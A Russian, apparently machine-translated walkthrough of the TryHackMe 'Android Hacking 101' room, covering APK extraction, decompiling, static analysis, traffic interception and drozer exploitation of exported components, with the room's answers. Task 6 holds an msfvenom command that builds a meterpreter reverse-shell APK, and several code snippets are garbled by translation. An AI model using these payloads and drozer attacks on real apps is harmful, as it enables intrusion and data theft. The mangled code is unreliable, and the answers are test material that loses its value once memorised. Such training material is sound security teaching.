[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Android Hacking 101](https://tryhackme.com/r/room/androidhacking101) 

Всего 1 заданий:
## Задание 1
Часто бывает так, что мы сталкиваемся с мобильными приложениями, когда проводим аудит безопасности или реализуем 
программы вознаграждения за обнаруженные ошибки, поэтому я решил создать эту комнату, где мы увидим набор тестов, 
которые я провожу при проведении такого рода аудита.
`What is Native And Hybrid Applications?`

**Native**: Это приложения, разработанные исключительно для мобильных операционных систем, Android или IOS. В 
Android вы используете язык программирования Java или kotlin, а в IOS — Swift или Objective-C. Эти языки 
программирования являются официальными для соответствующих операционных систем.

Гибридные: эти приложения используют такие технологии, как HTML, CSS и JavaScript, все они связаны и обрабатываются 
с помощью таких фреймворков, как Apache Córdova «PhoneGap», Ionic и других.
`What is android's SMALI code?`
Когда вы создаете код приложения, файл apk содержит файл .dex, который содержит двоичный байт-код Dalvik. Smali — 
это язык ассемблера, работающий на Dalvik VM, которая является JVM Android.

Пример:
Синтаксис Smali – Типы
Смали  регистрирует JesusFreke

Введение
В байт-коде dalvik регистры всегда 32-битные и могут хранить значения любого типа. 2 регистра используются для 
хранения 64-битных типов (Long и Double).

Указание количества регистров в методе
Есть два способа указать, сколько регистров доступно в методе. Директива .registers указывает общее  количество  
регистров в методе, в то время как альтернативная директива .locals указывает количество  непараметрических  
регистров в методе. Таким образом, общее количество регистров будет включать регистры, необходимые для хранения 
параметров метода.

Как параметры передаются в метод
При вызове метода параметры метода помещаются в последние n регистров. Если у метода 2 аргумента и 5 регистров 
(v0-v4), аргументы будут помещены в последние 2 регистра - v3 и v4.

Первым параметром нестатических методов всегда является объект, для которого вызывается метод.

Например, предположим, что вы пишете нестатический метод  LMyObject;->callMe(II)V. Этот метод имеет 2 целочисленных 
параметра, но он также имеет неявный параметр LMyObject; перед обоими целочисленными параметрами, так что всего у 
метода 3 аргумента.

Допустим, вы указываете, что в методе (v0- v4) есть 5 регистров, либо с помощью .registers 5 директивы , либо  с .
locals 2 помощью директивы (т. е. 2 локальных регистра + 3 регистра параметров). Когда метод вызывается, объект, 
для которого вызывается метод (т. е. ссылка this), будет в v2, первый целочисленный параметр будет в v3, а 
второй целочисленный параметр будет в v4.

Для статических методов все то же самое, за исключением отсутствия неявного this аргумента.

Зарегистрировать имена
Существует две схемы именования регистров — обычная схема именования v и схема именования p для регистров параметров.
Первый регистр в схеме именования p — это первый регистр параметров в методе. Итак, вернемся к предыдущему примеру 
метода с 3 аргументами и 5 общими регистрами. В следующей таблице показано обычное имя v для каждого регистра, за 
которым следует имя p для регистров параметров.

Вы можете ссылаться на регистры параметров по любому имени — это не имеет значения.

Мотивация введения регистров параметров
Схема именования p была введена в практических целях для решения распространенной проблемы при редактировании кода smali.

Допустим, у вас есть существующий метод с несколькими параметрами, и вы добавляете в метод некоторый код, и обнаруживаете, что вам нужен дополнительный регистр. Вы думаете: «Ничего страшного, я просто увеличу количество регистров, указанных в директиве .registers!».

К сожалению, это не так просто. Помните, что параметры метода хранятся в  последних  регистрах метода. Если вы увеличите количество регистров, вы измените регистры, в которые будут помещены аргументы метода. Поэтому вам придется изменить директиву .registers  и  перенумеровать каждый регистр параметров.

Но если  схема именования p  использовалась для ссылки на регистры параметров на протяжении всего метода, вы можете легко изменить количество регистров в методе, не беспокоясь о перенумерации существующих регистров.

Примечание: по умолчанию baksmali будет использовать  схему именования p  для регистров параметров. Если вы хотите отключить это по какой-то причине и заставить baksmali всегда использовать  схему именования v  , вы можете использовать опцию -p/--no-parameter-registers.

Длинные/двойные значения
Как упоминалось ранее, примитивы long и double (J и D соответственно) являются 64-битными значениями и требуют 2 регистров. Это важно иметь в виду, когда вы ссылаетесь на аргументы метода. Например, предположим, что у вас есть (нестатический) метод LMyObject;->MyMethod(IJZ)V. Параметры метода — LMyObject;, int, long, bool. Таким образом, этот метод потребует 5 регистров для всех своих параметров.

Кроме того, когда вы позже вызовете метод, вам придется указать оба регистра для любых аргументов двойной ширины в списке регистров для инструкции invoke-.

Application Structure. (APK)

AndroidManifest.xml : файл манифеста в двоичном формате XML .

classes.dex: код приложения, скомпилированный в формате dex.

resources.arsc: файл, содержащий предварительно скомпилированные ресурсы приложения в двоичном формате XML .

res/: папка, содержащая ресурсы, не скомпилированные в resources.arsc

assets/: необязательная папка, содержащая активы приложений, которые могут быть извлечены с помощью AssetManager.

lib/: необязательная папка, содержащая скомпилированный код, т.е. библиотеки собственного кода.

META-INF/: папка, содержащая файл MANIFEST.MF, в котором хранятся метаданные о содержимом JAR-файла. Иногда они хранятся в папке с именем original. Подпись APK также хранится в этой папке.

Каждый файл APK включает файл AndroidManifest.xml, который объявляет имя пакета приложения, компоненты версии и 
другие метаданные. Полную информацию о файле спецификаций манифеста Android можно посмотреть здесь. Ниже приведены 
лишь некоторые общие атрибуты, которые можно идентифицировать в AndroidManifest.

### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 2
В этой комнате пришло время настроить среду, здесь мы поговорим о рекомендуемых инструментах для взаимодействия с нашими приложениями.

Install Java Development Kit 1.7

JDK — это среда разработки для создания приложений, апплетов и компонентов с использованием языка программирования Java.

Установить Java

Комплект разработчика Java 1.7

Emulators

Эмулятор Android — это виртуальное устройство Android, представляющее определенное устройство Android. Вы можете использовать эмулятор Android в качестве целевой платформы для запуска и тестирования приложений Android на вашем ПК.

Не обязательно устанавливать эмулятор, если у вас рутированный телефон. Мой любимый эмулятор для Windows, Linux и Mac — Genymotion, так как он очень прост в использовании. Создайте учетную запись и загрузите установщик для вашей платформы/операционной системы.

Эмулятор Android Genymotion




Установите genymotion и войдите в свой аккаунт в приложении, теперь загрузите вашу любимую версию Android для тестирования. Я лично рекомендую 6.0.



Для пользователей Windows и Mac другим вариантом является эмулятор Nox.

Эмулятор Nox

Enable Developer options in your emulator or rooted phone

Необходимо активировать эту функцию для использования отладки USB.

Вы можете разблокировать параметры разработчика на любом смартфоне или планшете Android, найдя номер сборки в меню настроек и нажав на него несколько раз. Однако точное расположение вышеупомянутого номера сборки может отличаться в зависимости от производителя вашего телефона.

Настройки > О телефоне > Номер сборки > Нажмите 7 раз, чтобы стать разработчиком;



Теперь, Настройки > Параметры разработчика > Отладка по USB.



### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 3
Моя методология пентеста приложений Android.

### Ответьте на вопросы ниже
```commandline
Ответ не нужен
```

## Задание 4
Сбор информации — это первое, что нам нужно сделать, поскольку эта информация поможет нам перейти к следующему этапу 
наших тестов на проникновение.

Черный ящик : в тестировании на проникновение тестирование по методу черного ящика относится к методу, при котором 
этичный хакер не имеет никаких сведений об атакуемой системе.

Как найти заявку организации?

Easy,  Play Store : это платформа цифровой дистрибуции мобильных приложений для устройств с операционной системой 
Android.


Белый ящик : Тестирование проникновения белого ящика также может называться тестированием проникновения стеклянного 
ящика или тестированием проникновения прозрачного ящика. В любом случае, это подход к тестированию проникновения, 
который опирается на знание внутренней конфигурации целевой системы. Он использует эту информацию для тестовых 
случаев.

В реальном сценарии клиент предоставит нам мобильное приложение, пользователей и пароли для входа в систему, а также 
руководство пользователя по работе приложения.

Important

Не пользуемся онлайн-сервисами для загрузки APK-файла, не знаем, анализируем ли мы настоящее приложение.
### Ответьте на вопросы ниже
Как называется пакет Black Hat Europe?


```commandline
com.swapcard.apps.android.blackhat
```

## Задание 5
В этой части мы извлечем легитимный APK из эмулятора или устройства и получим исходный код.

TOOL

**Android Debug Bridge (ADB)**  — это инструмент разработки, который упрощает взаимодействие между устройством 
Android и персональным компьютером.

Как установить ADB на Windows, macOS и Linux

Примечание: Вам необходимо включить отладку USB на вашем эмуляторе или устройстве.

#### Как просмотреть устройства?
`adb devices`

#### Как извлечь apk?
Для этого вам необходимо установить приложение на свое устройство и знать имя пакета.
`adb shell pm path package_name`
Эта команда выводит путь к APK указанного
`adb pull <remote> [<locaDestination>]`
Эта команда тянет файл с удаленного на локальный . Если локальный не указан, он будет тянуть в текущую папку.

Now,how a get source code?

jadx: Пакет jadx позволяет вам просто загрузить APK и посмотреть на его исходный код Java. Что происходит под 
капотом, так это то, что jADX декомпилирует APK в smali, а затем преобразует smali обратно в Java.

Использование:
`jadx -d [path-output-folder] [path-apk-or-dex-file]`
Dex2Jar : используйте dex2jar для преобразования APK в JAR-файл.
`d2j-dex2jar.sh or .bat /path/application.apk`

Получив JAR-файл, просто откройте его с помощью JD- GUI, и вы увидите его код Java.
apktool : Этот инструмент получает исходный код в формате smali.
`apktool d file.apk`

jadx-gui:   версия пользовательского интерфейса jadx
`jadx\bin\jadx-gui`


### Ответьте на вопросы ниже
Инструмент для конвертации dex-файла в smali-код?
```commandline
d2j-dex2smali
```
Какой вариант сборки приложений возможен с помощью apktool?
```commandline
b
```
Какой путь к APK у Black Hat Europe?
```commandline
/data/app/com.swapcard.apps.android.blackhat-1/base.apk
```
Команда для извлечения apk из  Back Hat  Europe ?

Примечание: команда и путь
```commandline
adb pull /data/app/com.swapcard.apps.android.blackhat-1/base.apk
```
## Задание 6
Если все сделано без запуска программы, что мы собираемся определить в этой простой комнате?

- Слабое или неправильное использование криптографии
- Экспортированные действия по предпочтениям
- Приложения, позволяющие выполнять резервное копирование
- Приложения, которые можно отлаживать
- Разрешения приложения.
- Экземпляр(ы) Firebase
- Конфиденциальные данные в коде


Слабое или неправильное использование криптографии :  неправильное использование алгоритма шифрования может привести 
к раскрытию конфиденциальных данных, утечке ключей, нарушению аутентификации, небезопасному сеансу и атакам спуфинга.

Пример: Для реализации Java следующий API связан с шифрованием. Просмотрите параметры реализации шифрования.
```commandline
IvParameterSpec iv = new IvParameterSpec(initVector.getBytes("UTF-8"));
SecretKeySpec skeySpec = new SecretKeySpec(key.getBytes("UTF-8"), "AES");
```
Как это искать, когда у меня есть исходный код приложения? Есть супер продвинутый и замечательный инструмент, 
который называется grep. 
```commandline
grep -r "SecretKeySpec" *
grep -rli "aes" *
grep -rli "iv"
```

Откройте файл в вашем любимом текстовом редакторе. Gedit/Vim/subl и т. д. Используйте его для решения головоломки в 
моем ctf "LaxCTF". 

в реальной жизни:

Решение : использовать асимметричную криптографию.
Экспортированные действия предпочтений:  Как мы знаем, компонент активности Android — это экран(ы) приложения и действие(я), которые применяются на этом экране(ах), когда мы используем приложение. Когда обнаруживается, что действие используется совместно с другими приложениями на устройстве, поэтому оно остается доступным для любого другого приложения на устройстве.
Хорошо, воспользуемся этим в динамическом анализе... Как определить, что активность экспортируется?
Откройте AndroidManifest.xml с помощью вашего любимого текстового редактора (Gedit/Vim/subl и т. д.) или используйте 
cat и grep. 
`cat AndroidManifest.xml | grep "activity" --color`

Приложения, которые позволяют выполнять резервное копирование:  это считается проблемой безопасности, поскольку 
злоумышленники могут создать резервную копию вашего приложения через ADB, а затем перенести конфиденциальные данные 
вашего приложения на свой ПК.

Общие предпочтения.
каталог, возвращаемый getFilesDir().
getDataBase(path) также включает файлы, созданные SQLiteOpenHelper.
файлы в каталогах, созданных с помощью getDir(Sring, int).
файлы на внешнем хранилище, возвращаемые getExternalFilesDir (тип String).
Как это определить ?

Откройте AndroidManifest.xml с помощью вашего любимого текстового редактора (Gedit/Vim/subl и т. д.) или используйте 
cat и grep.
`cat AndroidManifest.xml | grep "android:allowBackup" --color`
Реальный сценарий? Вы используете свой разум для этого упражнения :3.
Решение : android:allowBackup="false"
Приложения, которые можно отлаживать : Отладка была включена в приложении, что упрощает для обратных инженеров 
подключение отладчика к нему. Это позволяет выгружать трассировку стека и получать доступ к вспомогательным классам 
отладки.

Как это определить ?

Откройте AndroidManifest.xml с помощью вашего любимого текстового редактора (Gedit/Vim/subl и т. д.) или используйте 
cat и grep. 

`cat AndroidManifest.xml | grep "android:debuggable" --color`

Пример динамического анализа, пока!

Разрешения приложений: Системные разрешения делятся на две группы: «обычные» и «опасные». Обычные группы разрешений 
разрешены по умолчанию, поскольку они не представляют риска для вашей конфиденциальности. (например, Android 
позволяет приложениям получать доступ к Интернету без вашего разрешения.) Однако опасные группы разрешений могут 
предоставлять приложениям доступ к таким вещам, как история вызовов, личные сообщения, местоположение, камера, 
микрофон и многое другое. Поэтому Android всегда будет запрашивать у вас одобрение опасных разрешений.

В более ранних версиях Android принятие потенциально опасных групп разрешений было делом «все или ничего». Вы либо 
разрешали все разрешения, необходимые приложению для работы — до установки — либо отклоняли их все, что означало, 
что вы не могли установить приложение.

Я собираюсь проанализировать разрешения приложения APK, сгенерированного Metasploit.

`msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > /root/tryhackme.apk`

Хорошо, КАК?

Откройте AndroidManifest.xml с помощью вашего любимого текстового редактора (Gedit/Vim/subl и т. д.) или используйте 
cat и grep. 

Экземпляр(ы) Firebase : в прошлом году исследователи безопасности обнаружили незащищенные базы данных Firebase тысяч 
мобильных приложений iOS и Android, которые раскрывают более 100 миллионов записей данных, включая текстовые пароли, 
идентификаторы пользователей, местоположение и, в некоторых случаях, финансовые записи, такие как банковские и 
криптовалютные транзакции.

Сервис Firebase от Google — одна из самых популярных платформ бэкэнд-разработки для мобильных и веб-приложений, 
которая предлагает разработчикам облачную базу данных, хранящую данные в формате JSON и синхронизирующую их в режиме 
реального времени со всеми подключенными клиентами.

Как это определить ? 

Сканер FireBase. Скрипты помогают аналитикам безопасности выявлять неправильно настроенные экземпляры Firebase.
```commandline
git clone https://github.com/shivsahni/FireBaseScanner
python FireBaseScanner.py -p /path/apk
```
Конфиденциальные данные в коде : пользователи, пароли, внутренний IP-адрес и многое другое... 
Используя ваш любимый текстовый редактор, Gedit/Vim/subl и т. д., grep или GUI- декомпилятор, вернитесь к 
реверсированию и поэкспериментируйте с вашим любимым инструментом.

В реальной жизни существуют очень плохие практики программирования! Например: 

Как автоматизировать этот процесс?
Очень интересно делать это вручную, но в реальном пентесте время не на нашей стороне.


Статический анализ – Фреймворки
#### Структура MARA :

Является фреймворком для обратного проектирования и анализа мобильных приложений. Это инструмент, который объединяет 
часто используемые инструменты обратного проектирования и анализа мобильных приложений, чтобы помочь в тестировании 
мобильных приложений на предмет угроз безопасности мобильных устройств OWASP. Его цель — сделать эту задачу проще и 
удобнее для разработчиков мобильных приложений и специалистов по безопасности.

Функции:
- Анализ манифеста APK
- Извлечь намерения
- Извлечь экспортированные действия
- Извлекаем приемники
- Извлечь экспортированные приемники
- Услуги по извлечению
- Извлечь экспортированные услуги
- Проверьте, можно ли отлаживать apk
- Проверьте, позволяет ли apk создавать резервные копии
- Проверьте, позволяет ли apk отправлять секретные коды.
- Проверьте, может ли apk получать двоичные SMS

Анализ безопасности

Статический анализ исходного кода на основе OWASP Top Mobile Top 10 и OWASP Mobile Apps Checklist
MARA способен выполнять как единичный, так и массовый анализ файлов apk, dex или jar.

и многое другое....

#### QARK

Это статический инструмент анализа кода, разработанный для распознавания потенциальных уязвимостей безопасности и 
проблемных моментов для приложений Android на базе Java. QARK был разработан как основанный на сообществе, доступный 
для всех и бесплатный для использования. QARK обучает разработчиков и персонал по информационной безопасности 
потенциальным рискам, связанным с безопасностью приложений Android, предоставляя четкие описания проблем и ссылки на 
авторитетные справочные источники. QARK также пытается предоставлять динамически сгенерированные команды ADB 
(Android Debug Bridge) для помощи в проверке потенциальных уязвимостей, которые он обнаруживает. Он даже динамически 
создаст специально созданное тестовое приложение в форме готового к использованию APK, специально разработанное для 
демонстрации потенциальных проблем, которые он обнаруживает, когда это возможно».       

#### MobSF

Мой любимый инструмент :3 — Mobile Security Framework (MobSF) — это автоматизированная комплексная платформа для 
тестирования на проникновение, анализа вредоносного ПО и оценки безопасности мобильных приложений 
(Android/iOS/Windows), способная выполнять статический и динамический анализ.

1. Информация

Отображение данных, таких как значок приложения, имя приложения, размер, имя пакета и т. д. Также отображаются MD5 и 
SHA1. Они могут быть полезны для обнаружения известных вредоносных приложений.

2. Параметры сканирования

· Повторно просканируйте приложение.
· Запустить динамический анализ
· Проверьте код Java и файл манифеста.

3. Сертификат подписчика

·Отображение информации о сертификате
·Определите, получено ли приложение из его первоначального источника.

4. Разрешения

· Анализирует разрешения
· Определяет свой статус относительно критичности и описание разрешений.

5. Бинарный анализ

· Это оценка угроз и тестирование уязвимостей на уровне двоичного кода.
· Его также можно использовать для анализа сторонних библиотек, что обеспечивает более глубокий анализ и лучшую видимость того, как приложения будут взаимодействовать с библиотеками.
· Это анализ двоичного кода для выявления проблем безопасности. Для сложных систем, использующих сторонние библиотеки, для которых исходный код недоступен, анализ двоичного кода помогает выявить проблемы.

6. API-интерфейс Android

Вы можете просмотреть API Android , используемые в приложении, такие как Java Reflection, Location.

7. Просматриваемые действия

Его можно безопасно вызвать из браузера.

8. Анализ безопасности

Анализ манифеста:

Найдите уязвимость внутри одного из компонентов в файле AndroidManifest.xml.

Анализ кода:

· Результат анализа Java-кода статическим анализатором.
· Выявляет потенциальные уязвимости, определяет их серьезность и файлы, в которых был обнаружен этот тип уязвимости. CVSS :

· Общая система оценки уязвимости

· Уязвимости присваивается базовая оценка CVSS от 0,0 до 10,0.

0.0 → Нет риска
0,1–3,9 → Низкий риск
4,0–6,9 → Средний риск
7,0–8,9 → Высокий риск
9,0–10,0 → Критическая оценка риска

КСВ:

· Перечень общих недостатков
· Это список слабых мест архитектуры, дизайна или кода программного обеспечения.

Анализ файла:

S показывает анализ файлов.

9. Анализ вредоносного ПО

Определите функциональность, происхождение и потенциальное воздействие данного образца вредоносного ПО, например вируса.

10. Разведка

URL-адрес:

Отображение списка URL-адресов, IP-адресов и файлов, в которых они хранятся или вызываются. Анализирует, куда приложение Android отправляет данные и где оно хранит информацию.

Электронные письма 

Строки:
· Анализирует текстовые файлы, находящиеся в каталоге res.
· Может содержать конфиденциальные данные.

11. Компоненты

Отображение полного списка компонентов (активность, служба, поставщик и получатель контента), импортированных библиотек и файлов без указания расширения.

### Ответьте на вопросы ниже
Как называется экземпляр Firebase в приложении Black Hat Europe?
```commandline
swapcard-android-app-2014
```
Отладочный релиз Android-InsecureBankv2, проверьте это и то, какая активность не защищена.
```commandline
com.android.insecurebankv2.ChangePassword
```
что такое вредоносные разрешения в приложении Android-InsecureBankv2?
```commandline
android.permission.SEND_SMS
```

## Задание 7
Запутать код:
это процесс изменения исполняемого файла таким образом, чтобы он больше не был полезен хакеру, но оставался 
полностью функциональным. Хотя этот процесс может изменять фактические инструкции метода или метаданные, он не 
изменяет вывод программы. Чтобы было ясно, при достаточном количестве времени и усилий почти весь код может быть 
подвергнут обратному проектированию. Однако на некоторых платформах (таких как Java, Android, iOS и .NET) бесплатные 
декомпиляторы могут легко выполнить обратное проектирование исходного кода из исполняемого файла или библиотеки 
практически мгновенно и без усилий. Автоматизированное запутывание кода делает обратное проектирование программы 
сложным и экономически нецелесообразным.

### Proguard:

Для обфускации кода используйте утилиту Proguard, которая выполняет следующие действия:
- Удаляет неиспользуемые переменные, классы, методы и атрибуты;
- Устраняет ненужные инструкции;
- Удаляет информацию об обучающем материале: обфускация кода Androiddepuracion;
- Переименовывает классы, поля и методы с неразборчивыми именами.

### ДЕКСГАРД

Расширенная коммерческая версия Proguard. Этот инструмент способен реализовать технику шифрования текста и 
переименовывать классы и методы с не-ASCII символами.

Статический анализ – Деобфускация

### Deguard: 

- Он основан на мощных вероятностных графических моделях, изученных на основе тысяч программ с открытым исходным кодом.
- Используя эти модели, Deguard извлекает важную информацию из Android APK, включая имена методов и классов, а также 
сторонние библиотеки. 
- Deguard может раскрывать декодеры строк и классы, которые обрабатывают конфиденциальные данные 
во вредоносном ПО Android.


### Ответьте на вопросы ниже
```commandline
Ответ не нужен
```

## Задание 8
завершено выполнение программы, 
Как устанавливать приложения с помощью adb?
`adb install apkfilename.apk`
хорошо, как теперь перехватить трафик приложения?

Burp Suite :  интегрированная платформа для проведения тестирования безопасности веб-приложений. Различные ее 
инструменты работают вместе без проблем, поддерживая весь процесс тестирования, от первоначального отображения и 
анализа поверхности атаки приложения до поиска и эксплуатации уязвимостей безопасности.

Настройте прослушиватель Burp Proxy

Установка доверенного центра сертификации на уровне ОС Android (устройство с правами root/эмулятор) для Android N+ 
выполняется следующим образом:
```commandline
openssl x509 -inform PEM -subject_hash -in BurpCA.pem | head -1
cat BurpCA.pem > 9a5ba580.0
openssl x509 -inform PEM -text -in BurpCA.pem -out /dev/null >> 9a5ba580.0
adb root
abd remount
adb push 9a5ba580.0 /system/etc/security/cacerts/
adb shell "chmod 644 /system/etc/security/cacerts/9a5ba580.0"
adb shell "reboot"
```

ПИД-кот

Инструмент для отображения записей журнала для определенного пакета приложения, если в приложении включен параметр 
debug=true. 

### drozer
drozer помогает обеспечить уверенность в том, что приложения и устройства Android, разрабатываемые или 
развертываемые в вашей организации, не представляют неприемлемого уровня риска. Позволяя вам взаимодействовать с 
виртуальной машиной Dalvik, конечными точками IPC других приложений и базовой ОС.

drozer предоставляет инструменты, которые помогут вам использовать и делиться публичными эксплойтами для Android. 
Для удаленных эксплойтов он может генерировать шеллкод, чтобы помочь вам развернуть агента drozer в качестве 
удаленного инструмента администратора с максимальным рычагом на устройстве.

Drozer — это комплексный фреймворк для аудита безопасности и предотвращения атак для Android.
Простой пример: злоупотребление незащищенными действиями:
Требование для этого - установить drozer на свой компьютер и агент drozer на свой эмулятор или устройства. Щелкните 
в заголовке, чтобы получить руководство по установке...

Команды:
```commandline
adb forward tcp:31415 tcp:31415
drozer console connect
```
Теперь скачайте и установите apk для этого примера.

Получение информации о пакете:
```commandline
run app.package.list -> see all the packages installed
run app.package.info -a -> view package information.
```

Определение поверхности атаки -> незащищенные действия и многое другое....
`run app.package.attacksurface package_name`
просмотреть, какие действия могут быть использованы.
`run app.activity.info -f package_name`

начать  деятельность незащищенным  ! 
`run app.activity.start --component package name component_name`

Базовая шпаргалка Drozer

Использование поставщика контента
```commandline
run app.provider.info -a package_name
run scanner.provider.finduris -a package_name
run app.provider.query uri
run app.provider.update uri --selection conditions selection_arg column data
run scanner.provider.sqltables -a package_name
run scanner.provider.injection -a package_name
run scanner.provider.traversal -a package_name
```

Эксплуатация службы
```commandline
run app.service.info -a package_name
run app.service.start --action action --component package_name component_name
run app.service.send package_name component_name --msg what arg1 arg2 --extra type key value --bundle-as-obj
```
#### Inspeckage — инспектор пакетов Android

Мой любимый инструмент, Inspeckage — это инструмент, разработанный для динамического анализа приложений Android. 
Применяя хуки к функциям API Android , Inspeckage поможет вам понять, что делает приложение Android во время 
выполнения. Inspeckage позволит вам взаимодействовать с некоторыми элементами приложения, такими как действия и 
поставщики (даже неэкспортированные), и применять некоторые настройки на Android.

Поскольку динамический анализ приложений Android (обычно через хуки) является основной частью нескольких тестов 
безопасности мобильных приложений, потребность в инструменте, который может помочь нам выполнить эти тесты, реальна. 
Несмотря на то, что есть другие инструменты, которые обещают помочь вам сделать это, я столкнулся с некоторыми 
ограничениями при их тестировании:

- Отсутствие взаимодействия с пользователем, проводящим тесты;
- Работает только в эмуляторах;
- Достаточно времени для обновления инструмента после обновления Android;
- Очень плохой результат;
- Очень дорогая установка.
- Возможности инспектора пакетов Android

С помощью Inspeckage мы можем получить большой объем информации о поведении приложения:

##### Сбор информации
- Запрошенные разрешения;
- Разрешения приложений;
- Общие библиотеки;
- Экспортируемая и неэкспортируемая деятельность, поставщики контента, вещательные приемники и услуги;
- Проверьте, можно ли отлаживать приложение;
- Версия, UID и GID;
- и т. д.

#### Крючки
С помощью хуков мы можем видеть, что делает приложение в режиме реального времени:
- Общие настройки (журнал и файл);
- Сериализация;
- Крипто;
- Хэши;
- SQLite;
- HTTP ( HTTP- прокси-инструмент по-прежнему остается лучшей альтернативой);
- Файловая система;
- Разное (Буфер обмена, URL.Parse());
- Веб-просмотр;
- МПК .

Как использовать:

КОНЕЦ Динамического Анализа.

ВАЖНЫЙ:

Небезопасное хранение данных

Мы полностью поработали с нашим приложением, теперь пришло время увидеть файлы, созданные локально.

Многие разработчики предполагают, что хранение данных на стороне клиента ограничит доступ других пользователей к 
этим данным. Интересно, что большинство основных нарушений безопасности мобильных приложений были вызваны 
небезопасным или ненужным хранением данных на стороне клиента. Файловые системы на устройствах больше не являются 
изолированной средой, а рутирование или джейлбрейк обычно обходят любую защиту.

Необходимо понимать, какие существуют типы данных и почему они хранятся небезопасно.

Данные — имена пользователей, токены аутентификации или пароли, файлы cookie, данные о местоположении, сохраненные 
журналы приложений или отладочная информация, кэшированные сообщения приложений или история транзакций, UDID или 
EMEI, персональные данные (DoB, адрес, социальные сети и т. д.), имя устройства, имя сетевого подключения, частные 
вызовы API для пользователей с высокими ролями, данные кредитных карт или данные учетных записей и т. д.

Все приложения (корневые и нет) имеют каталог данных по умолчанию, который называется /data/data/<package_name>. По 
умолчанию базы данных приложений, настройки и все остальные данные находятся здесь.

базы данных /: здесь находятся базы данных приложения
lib /: библиотеки и помощники для приложения
файлы /: другие связанные файлы
shared_prefs /: предпочтения и настройки
кэш /: ну, кэши
Для взаимодействия с устройством или эмулятором 

adb shell

Файл базы данных SQLite

После того, как вы получите доступ к файлу базы данных SQLite на эмуляторе, устройстве с правами root или через оболочку adb / запуск от имени [имя пакета], у вас будет несколько вариантов проверки схемы и базы данных SQLite на устройстве.

Проверка базы данных SQLite с помощью графического интерфейса

Сначала извлеките файл с устройства, затем используйте программное обеспечение с графическим интерфейсом, чтобы просмотреть схему и содержимое. Я использую браузер SQLite, который позволяет вам просматривать схему базы данных, содержимое таблицы, а также выполнять некоторые простые скрипты SQL .

`adb pull /data/data/package-name/databases/sqlitedatabse`

Проверка базы данных SQLite с помощью инструмента командной строки sqlite3

Для меня более простым вариантом является использование инструмента командной строки sqlite3 для проверки базы данных из оболочки adb.
```commandline
cd data/data/package-name/databases/
sqlite3 db-name
.tables
.schema table-name
```
Пример из реальной жизни:

Файлы общих настроек

API SharedPreferences обычно используется для постоянного сохранения небольших коллекций пар «ключ-значение». Данные, хранящиеся в объекте SharedPreferences, записываются в текстовый XML- файл. Объект SharedPreferences может быть объявлен доступным для чтения всем (всем приложениям) или закрытым. Неправильное использование API SharedPreferences часто может привести к раскрытию конфиденциальных данных. Рассмотрим следующий пример:
```commandline
SharedPreferences sharedPref = getSharedPreferences( " key " , MODE_WORLD_READABLE );
 SharedPreferences . Редактор editor = sharedPref . edit();
редактор.putString ( " имя пользователя " , " администратор " );
редактор .putString ( " пароль " , " суперсекретный " );
редактор . commit();
```
После вызова активности будет создан файл key.xml с предоставленными данными. Этот код нарушает несколько рекомендаций.
```commandline
<? xml версия = ' 1.0 ' кодировка = ' utf-8 ' автономный = ' да ' ?>
< карта >
  < string  name = " имя пользователя " >администратор</ string >
  < string  name = " пароль " >суперсекретно</ string >
</ карта >
```
Пример из реальной жизни: 


### Ответьте на вопросы ниже
Прочитайте вышеизложенное.
```commandline
Ответ не нужен
```

## Задание 9
Обнаружение root-прав на Android-устройстве:

Мое объяснение этому таково:

`если (устройство && эмулятор = рутированный):
    распечатать "приложение летит в дерьмо!"
еще:
    распечатать "приложение найдено"  `

Таким образом, это лучший способ проверить в приложении, имеет ли устройство права root или нет, чтобы избежать кражи данных, но 100%-ного способа проверить наличие прав root не существует.

Проверка на наличие тестовых ключей : Test-Keys имеет отношение к тому, как ядро подписано при компиляции. По умолчанию стандартные прошивки Android от Google собираются с тегами release-keys. Test-Keys означает, что оно подписано пользовательским ключом, сгенерированным сторонним разработчиком. В частности, он проверит свойства сборки («android.os.Build.TAGS») на наличие тестовых ключей.
```commandline
private boolean detectTestKeys() { 
    String buildTags = android.os.Build.TAGS ; return buildTags != null && buildTags.contains( " test-keys" ); }
```
Проверьте наличие двоичного файла «su» : проверка двоичного файла su предназначена для идентификации 
суперпользователя на устройстве. Этот двоичный файл устанавливается, когда вы пытаетесь получить root-доступ к 
телефону с помощью таких приложений, как kinguser или через fastboot в Android. Эти файлы необходимы для того, чтобы 
можно было получить root-доступ к телефону и стать суперпользователем. Наличие этого двоичного файла можно проверить 
по следующим путям.

`private boolean checkForSuBinary() { return checkForBinary( "su" ); // функция доступна ниже }`
Проверьте наличие двоичного файла «busybox»:  если устройство было рутировано, то чаще всего Busybox также был 
установлен. Busybox — это двоичный файл, который предоставляет множество общих команд Linux . Запуск busybox — 
хороший признак того, что устройство было рутировано.

`private boolean checkForBusyBoxBinary() { return checkForBinary( "busybox" ); //функция доступна ниже }`
   

Проверка SuExists: проверка другой файловой системы на наличие двоичного файла su. 
```commandline
private boolean checkSuExists() { 
    Process process = null; 
    try { 
        process = Runtime.getRuntime ( ).exec(new String[] 
                {"/system /xbin/which", "su"}); 
        BufferedReader in = new BufferedReader( 
                new InputStreamReader(process.getInputStream())); 
        String line = in.readLine(); 
        process.destroy(); 
        return line != null; 
    } catch (Exception e) { 
        if (process != null) { 
            process.destroy(); 
        } 
        return false; 
    } 
}
```


На устройствах с правами root часто ищутся следующие пути, исполняемые файлы Su и busybox. 
```commandline
private String[] binaryPaths= { 
        "/data/local/", 
        "/data/local/bin/", 
        "/data/local/xbin/", 
        "/sbin/", 
        "/su/bin/", 
        "/system/bin/", 
        "/system/bin/.ext/", 
        "/system/bin/failsafe/", " 
        /system/sd/xbin/", 
        "/system/usr/we-need-root/", 
        "/system/xbin/", 
        "/system/app/Superuser.apk", 
        "/cache", 
        "/data", 
        "/dev" 
};
```

Обнаружение эмулятора:
Мое объяснение этому таково:

`если (естьЭмулятор):

    распечатать "приложение летит в дерьмо!"
еще:
    распечатать "приложение найдено" `

Сначала вам нужно проверить предварительно декомпилированный исходный код и проверить функции, содержащие строки типа «generic | emulator | google_sdk» и функции типа «isEmulator | emulatorDetection… и т. д.» … используйте свои навыки поиска и внимательно прочитайте код.

#### Закрепление SSL : 

